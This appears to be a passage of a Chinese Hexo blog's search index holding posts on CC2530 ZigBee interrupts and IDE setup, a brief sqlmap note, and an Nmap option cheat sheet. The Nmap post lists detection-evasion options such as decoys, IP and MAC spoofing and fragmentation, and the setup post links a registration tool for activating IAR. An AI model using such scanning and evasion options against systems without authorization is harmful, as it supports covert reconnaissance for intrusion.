href="#EA" class="headerlink" title="EA"></a>EA</h1><p>总CPU开关中断，令其为1则为开关闭合</p><h1 id="PxIE"><a href="#PxIE" class="headerlink" title="PxIE"></a>PxIE</h1><p>组使能位，控制PxIEN</p><p>注意：可以直接令P0IE=1，若要设置P1IE为1，则令IEN2 |=0x10；相当于P1IE=1</p><h1 id="PxIEN"><a href="#PxIEN" class="headerlink" title="PxIEN"></a>PxIEN</h1><p>对应的中断使能标志位，使用方法：PxIEN |= 0x__；为1则为闭合</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-74.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-75.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-76.png" alt=""></p><h1 id="PICTL寄存器"><a href="#PICTL寄存器" class="headerlink" title="PICTL寄存器"></a>PICTL寄存器</h1><p>0代表上升沿，1代表下降沿。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-77.png" alt=""></p><h1 id="PxIFG"><a href="#PxIFG" class="headerlink" title="PxIFG"></a>PxIFG</h1><p>中断状态标志寄存器, 当发生中断时，相应位将被置1</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-79.png" alt=""></p><h1 id="中断函数"><a href="#中断函数" class="headerlink" title="中断函数"></a>中断函数</h1><p>pragma vector=PxINT_VECTOR（x=0,1,2）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pragma <span class="built_in">vector</span>=PxINT_VECTOR（x=<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>）</span><br><span class="line">__interrupt  <span class="keyword">void</span>  fn()</span><br><span class="line">&#123;</span><br><span class="line">PxIFG=<span class="number">0</span>; PxIF=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数最后需要将PxIFG和PxIF清零。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-78.png" alt=""></p><p>最后附上一段能够按按钮控制灯亮灭的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iocc2530.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i,j;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)</span><br><span class="line">     <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">30</span>;j++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  P0SEL &amp;=<span class="number">0xDF</span>;<span class="comment">// 1101 1111 //P0_5设置为普通IO口</span></span><br><span class="line">  P0DIR &amp;=<span class="number">0xDF</span>;<span class="comment">// 1101 1111 //P0_5设置为输入</span></span><br><span class="line">  P0INP &amp;=<span class="number">0xDF</span>;<span class="comment">// 1101 1111 //P0_5设置为上下拉模式</span></span><br><span class="line">  P2INP &amp;=<span class="number">0xDF</span>;<span class="comment">// 1101 1111 //P0组配置成上拉模式</span></span><br><span class="line">  </span><br><span class="line">  EA=<span class="number">1</span>;<span class="comment">//闭合总CPU</span></span><br><span class="line">  P0IE=<span class="number">1</span>;<span class="comment">//P1IE如果要设置为1，那么我们不能直接用P1IE=1,IEN2 |=0x10;// 0001 0000</span></span><br><span class="line">  <span class="comment">//IEN2 |=0x10;//相当于P1IE=1</span></span><br><span class="line">  P0IEN |=<span class="number">0X20</span>;<span class="comment">// 0010 0000 设置3个中断使能标志位，让相应的中断开关合上</span></span><br><span class="line">  </span><br><span class="line">  PICTL |=<span class="number">0x01</span>;<span class="comment">//把P0这一组配置成下降沿触发//PICTL |=0x02则为把P1组配置成下降沿</span></span><br><span class="line">  </span><br><span class="line">  P1DIR |=<span class="number">0X01</span>;<span class="comment">//配置P1_0位输出</span></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>);<span class="comment">//死循环，不结束函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize=none</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> vector=P0INT_VECTOR</span></span><br><span class="line"><span class="function">__interrupt <span class="keyword">void</span> <span class="title">fsdfas</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(P0IFG &amp; <span class="number">0x20</span>)<span class="comment">// 0010 0000</span></span><br><span class="line">    &#123;<span class="comment">//P0组的第5位 P0_5引发了外部中断</span></span><br><span class="line">        <span class="built_in">delay</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>==P0_5)</span><br><span class="line">        &#123;<span class="comment">//说明确实是连接在P0_5的按钮触发了外部中断</span></span><br><span class="line">           P1_0 ^=<span class="number">1</span>;<span class="comment">//异或操作</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    P0IFG=<span class="number">0</span>; </span><br><span class="line">    P0IF=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZigBee入门</title>
      <link href="/2020/01/13/ZigBee%E5%85%A5%E9%97%A8/"/>
      <url>/2020/01/13/ZigBee%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<ul><li>学习ZigBee不仅仅是学习控制器本身，还要掌握一堆叫做协议栈的代码和网络的一些相关东西</li></ul><p>ZigBee是无线设备之间的一种通信方式，类似于任人和人之间的普通话交流，普通话就是一种通信方式</p><p>ZigBee，ZigBee通信方式，ZigBee协议这三者没任何区别，只是说法不同而已</p><p>ZigBee的作用就是用于无线模块和模块之间的通信，构建无线局域网</p><p>无线传感网络：如果这个无线局域网用于传感器的数据收集和监控，那么这个网络就叫做无线传感器网络，是无线局域网的一种具体应用</p><p>引入ZigBee通信方式的原因：</p><ul><li>WiFi：通信速率大，功耗大等</li><li>蓝牙：功耗小，组网的节点数较少</li><li>ZigBee：可以组件大规模的网络，功耗低（TI CC2530 正常工作电流8mA，最低工作达到几个uA），缺点为通信速率小，MAX=250KB</li></ul><p>此次使用的是CC2530芯片</p><h1 id="环境的安装和搭建"><a href="#环境的安装和搭建" class="headerlink" title="环境的安装和搭建"></a>环境的安装和搭建</h1><p>工作环境IAR的安装：</p><p><a href="https://pan.baidu.com/s/1YvVTsz7ZBu1c3FSTDQVjVA" target="_blank" rel="noopener">下载链接</a>，提取码：vbzy</p><p>使用注册工具激活：</p><p><a href="https://pan.baidu.com/s/1iCz3AGJwQPoXLJ5Uf5rHwQ" target="_blank" rel="noopener">下载链接</a>，提取码：2c5p</p><p>注意：Win7以上的系统激活的时候需要右键以管理员方式运行软件，否则会在后面的编译代码的过程中出现错误，<a href="https://zhidao.baidu.com/question/447439875.html" target="_blank" rel="noopener">详见链接</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/u83GDwMvLFlJB2W.png" style="zoom:50%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/aJf8yK4ZkPORcSX.png" style="zoom:50%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/IrqQgWvn1JaZCz7.png" style="zoom:50%;" /><p>如图所示激活操作，其余操作只需next即可</p><h1 id="新建工程文件"><a href="#新建工程文件" class="headerlink" title="新建工程文件"></a>新建工程文件</h1><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/YM1nrkzWNiZh3KL.png" style="zoom:50%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/hKd4nOpzQ8c6DqH.png" style="zoom:50%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/M7zojwX6V3TRxg9.png" style="zoom:50%;" /><p>C语言.c文件建立与保存</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/2yUOpqJR5MWLecm.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/P5ECVbMHxGUvI69.png" style="zoom:50%;" /><p>将文件添加到工程中：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/Er96gzcCAYIORKk.png" style="zoom:50%;" /><p>写入代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iocc2530.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  P1DIR |=<span class="number">0X01</span>;<span class="comment">//让P_0为输出</span></span><br><span class="line">  P1_0=<span class="number">1</span>;<span class="comment">//0为低电平，使二极管发光，1为高电平</span></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/htJEQRjI3Dfepy4.png" style="zoom:50%;" /><p>点击编译：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/RmyKXTsE79GHuOl.png" style="zoom:50%;" /><p>在弹出的框框中给工程工作空间命名：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/j3tPOgkvs1MpoEr.png" style="zoom:50%;" /><p>保存，编译通过</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/b8COxYTdSlU5sIV.png" style="zoom:50%;" /><p>以下为工程目录中各文件的介绍：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/JzwFsD25EGR9S4C.png" style="zoom:50%;" /><h1 id="ZigBee仿真器"><a href="#ZigBee仿真器" class="headerlink" title="ZigBee仿真器"></a>ZigBee仿真器</h1><p>仿真与下载程序用到的一种硬件</p><p>需啊在Windows环境下安装驱动才可以使用</p><p><a href="https://pan.baidu.com/s/1cM9o3uMKPdgISDyFvodyMg" target="_blank" rel="noopener">驱动下载链接</a>，提取码：3gbw</p><p>在电脑USB端口插上仿真器，打开设备管理器，右键新加进来的前面有黄色感叹号的标致，点击更新驱动</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/uCKOXfbs7zI5GaM.png" style="zoom:50%;" /><p>点击浏览定位到驱动文件夹，随后下一步安装即可</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/WafLPxBkTDVo4vM.png" style="zoom:50%;" /><p>随后进行下载操作（即将程序下载到板子里）</p><h1 id="下载前的配置操作"><a href="#下载前的配置操作" class="headerlink" title="下载前的配置操作"></a>下载前的配置操作</h1><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/ANBYtOsRPDoSCHQ.png" style="zoom:50%;" /><p>器件选择：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/yMp4BiOlKfHmPq3.png" style="zoom:50%;" /><p>点击后弹出一个文件夹，此文件夹在IAR软件的安装目录下</p><p>选择–&gt;Texas Instruments–&gt;CC2530F256，打开即可</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/k8Cwd32T9RKJlWy.png" style="zoom:50%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/OaqwEvyUFskYjpV.png" style="zoom:50%;" /><p>Linker连接配置：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/M8GDpaRTysNzZhE.png" style="zoom:50%;" /><p>Debugger选择：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/i9jpoArZXJbNlcU.png" style="zoom:50%;" /><p>点击OK后即可下载到板子中</p><p>点击顺序如下：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/yUYRqJVPsxOf97B.png" style="zoom:50%;" /><p>以下为各个图标所代表的含义：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/YH5QhtF6EwV7AS3.png" style="zoom:50%;" /><h1 id="导出为Hex镜像文件供他人使用"><a href="#导出为Hex镜像文件供他人使用" class="headerlink" title="导出为Hex镜像文件供他人使用"></a>导出为Hex镜像文件供他人使用</h1><p>需要用到SmartRF flash programmer这款软件</p><p><a href="https://pan.baidu.com/s/1TyV7qdPfyicisiA6sISpzg" target="_blank" rel="noopener">下载链接</a>，提取码：n4br</p><p>点击安装即可，安装完成后桌面会出现以下图标，点击即可打开应用</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee%E5%85%A5%E9%97%A8/MDvHk5m8SolWeKB.png" alt=""></p><p>另外需要在IAR中导出后缀为.Hex的文件</p><p>在输入框中输入你想命名的.Hex文件（注：格式为文件名+.hex）</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/8jDiUsRfWE7ZKbQ.png" style="zoom:50%;" /><p>另外在Output format处选择intel-extended，OK即可</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/bkgJFvfWYCnoROD.png" style="zoom:50%;" /><p>随后编译，可看见在此目录下多了一个a.hex的文件</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/lfVyDi1gH8e2TrB.png" style="zoom:50%;" /><p>在 SmartRF flash programmer 软件的flash image中选择到此文件，点击perform action，即可将文件烧到板子里面去</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/F2XMEWZfcy7vSJQ.png" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用</title>
      <link href="/2020/01/13/sqlmap%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/01/13/sqlmap%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>这张图片只有登录码云才能看-.-（懒得搞了）</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap使用/inner.png" style="zoom: 36%;" />]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap的基础使用</title>
      <link href="/2020/01/12/Nmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/01/12/Nmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>nmap这个渗透工具一般有在渗透的准备阶段，用于收集用户的信息，为后面的渗透做情报支持</p><p>Nmap是主机扫描工具，他的图形化界面是Zenmap，分布式框架为Dnmap。</p><p>Nmap可以完成以下任务：</p><ul><li>主机探测</li><li>端口扫描</li><li>版本检测</li><li>系统检测</li><li>支持探测脚本的编写</li></ul><p>Nmap在实际中应用场合如下：</p><ul><li>通过对设备或者防火墙的探测来审计它的安全性</li><li>探测目标主机所开放的端口</li><li>通过识别新的服务器审计网络的安全性</li><li>探测网络上的主机</li></ul><p>常见服务对应端口号：</p><table><thead><tr><th align="center"><strong>服务</strong></th><th align="center"><strong>端口号</strong></th></tr></thead><tbody><tr><td align="center">HTTP</td><td align="center">80</td></tr><tr><td align="center">HTTPS</td><td align="center">443</td></tr><tr><td align="center">Telnet（远程登录）</td><td align="center">23</td></tr><tr><td align="center">SSH（安全登录），SCP（文件传输），端口重定向</td><td align="center">22</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/SMTP/175887?fr=aladdin" target="_blank" rel="noopener">SMTP</a>（简单邮件传输协议）</td><td align="center">25</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/POP3/175122?fr=aladdin" target="_blank" rel="noopener">POP3</a>（ 邮局协议版本3 ）</td><td align="center">110</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/weblogic/451978?fr=aladdin" target="_blank" rel="noopener">WebLogic</a></td><td align="center">7001</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/tomcat/255751?fr=aladdin" target="_blank" rel="noopener">TOMCAT</a>（ Java Web服务器 ）</td><td align="center">8080</td></tr><tr><td align="center">WIN2003远程登录</td><td align="center">3389</td></tr><tr><td align="center">Oracle数据库</td><td align="center">1521</td></tr><tr><td align="center">MY SQL SERVER数据库</td><td align="center">1433</td></tr><tr><td align="center">MySQL数据库</td><td align="center">3306</td></tr></tbody></table><p>在kali中使用：命令行nmap即可使用</p><p>nmap -version即可查看nmap的版本信息</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Nmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-27.png" alt=""></p><p>扫描简单来说就是四个动作</p><ul><li>统一沟通语言（TCP/IP协议）</li><li>发出刺激（ICMP报文头）</li><li>受到刺激的反馈（ICMP的反馈）</li><li>通过比对刺激和反馈完成扫描</li></ul><p>说实话这四个动作具体是啥意思我也不是很明白</p><p>将你要扫描的设备地址告诉nmap可以通过下面的方法实现统一的格式</p><ul><li>namp [扫描类型] [设置] {设备地址}</li></ul><p><strong>nmap常用的参数及意义</strong></p><ol><li>-A ：选择用于使用进攻性方式扫描；全面系统检测，启用脚本检测，扫描。（推荐）</li><li>-T4：指定扫描过程使用的时序，表示禁止动态扫描延时超过的时间；总共有6个级别（0-5）。级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4 。*（ 假如防火墙是一幢大楼的门锁，那么IDS就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。 ）（推荐）</li><li>-oX test.xml：将扫描结果生成test.xml文件</li><li>-oG test.txt：将扫描结果生成test.txt文件</li><li>-sn：只进行主机发现，不进行端口扫描</li><li>-O：指定Nmap进行系统版本扫描</li><li>-sV：指定Nmap进行服务版本扫描</li><li>-p <code>&lt;port ranges&gt;</code>：扫描指定的端口</li><li>-sS/sT/sA/sW/sM：指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描</li><li>-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况</li><li>-script  <code>&lt;script name&gt;</code> : 指定扫描脚本</li><li>-Pn ： 不进行ping扫描（推荐）</li><li>-sP : 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping</li><li>-PI : 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。</li><li>-iL 1.txt : 批量扫描1.txt中的目标地址</li><li>-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现</li><li>-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况</li><li>-sO: 使用IP protocol 扫描确定目标机支持的协议类型</li><li>-PO : 使用IP协议包探测对方主机是否开启</li><li>-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机</li><li>-PS/PA/PU/PY : 使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现</li><li>-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态</li><li>-e eth0：指定使用eth0网卡进行探测</li><li>-f : –mtu <code>&lt;val&gt;</code>: 指定使用分片、指定数据包的 MTU.</li><li>-b <code>&lt;FTP relay host&gt;</code>: 使用FTP bounce scan扫描方式</li><li>-g： 指定发送的端口号</li><li>-r：不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）</li><li>-v ：表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态（推荐）</li><li>-n : 表示不进行DNS解析；</li><li>-D &lt;decoy1,decoy2[,ME],…&gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址</li><li>-R ：表示总是进行DNS解析。</li><li>-F : 快速模式，仅扫描TOP 100的端口</li><li>-S <IP_Address>: 伪装成其他 IP 地址</li><li>–ttl <code>&lt;val&gt;</code>: 设置 time-to-live 时间</li><li>–badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）</li><li>–dns-servers : 指定DNS服务器</li><li>–system-dns : 指定使用系统的DNS服务器</li><li>–traceroute : 追踪每个路由节点</li><li>–scanflags <code>&lt;flags&gt;</code>: 定制TCP包的flags</li><li>–top-ports <code>&lt;number&gt;</code> :扫描开放概率最高的number个端口</li><li>–port-ratio <code>&lt;ratio&gt;</code>: 扫描指定频率以上的端口。与上述–top-ports类似，这里以概率作为参数</li><li>–version-trace: 显示出详细的版本侦测过程信息</li><li>–osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）</li><li>–osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统</li><li>–data-length <code>&lt;num&gt;</code>: 填充随机数据让数据包长度达到 Num</li><li>–ip-options <code>&lt;options&gt;</code>: 使用指定的 IP 选项来发送数据包</li><li>–spoof-mac &lt;mac address/prefix/vendor name&gt; : 伪装 MAC 地址</li><li>–version-intensity <code>&lt;level&gt;</code>: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</li><li>–version-light: 指定使用轻量侦测方式 (intensity 2)</li><li>–version-all: 尝试使用所有的probes进行侦测 (intensity 9)</li></ol><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Nmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-28.png" alt=""></p><p>参考原文链接：<a href="https://www.cnblogs.com/bonelee/p/9188122.html" target="_blank" rel="noopener">1</a>，<a href="https://www.cnblogs.com/liaopeng123/p/11281516.html" target="_blank" rel="noopener">2</a></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My_Blog&#39;s Birthday</title>
      <link href="/2020/01/08/My_Blog&#39;s%20Birthday/"/>
      <url>/2020/01/08/My_Blog&#39;s%20Birthday/</url>
      
        <content type="html"><![CDATA[<p><strong>纪念诞辰</strong></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/My_Blog's Birthday/1576157953127.jpg" style="zoom:33%;" /><p>​                                                                                                                                       ————<strong>2020-1-8</strong></p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
